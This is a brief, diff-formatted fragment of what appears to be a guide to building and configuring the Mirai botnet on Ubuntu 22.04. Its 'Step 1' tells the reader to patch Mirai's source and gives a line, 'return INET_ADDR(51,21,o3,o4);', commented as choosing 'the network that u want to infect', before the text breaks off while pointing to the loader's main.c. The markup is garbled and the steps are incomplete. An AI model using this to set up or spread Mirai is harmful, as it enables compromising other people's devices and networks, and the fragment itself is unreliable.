@@ -1,7 +1,7 @@
 ## Complete Ubuntu 22.04 Setup 
 
 ### Step 1: modification
-
+ 
 1. **mirai.patch :**
 +    return INET_ADDR(51,21,o3,o4); // the network that u want to infect
 2. **mirai/loader/src/main.c :**
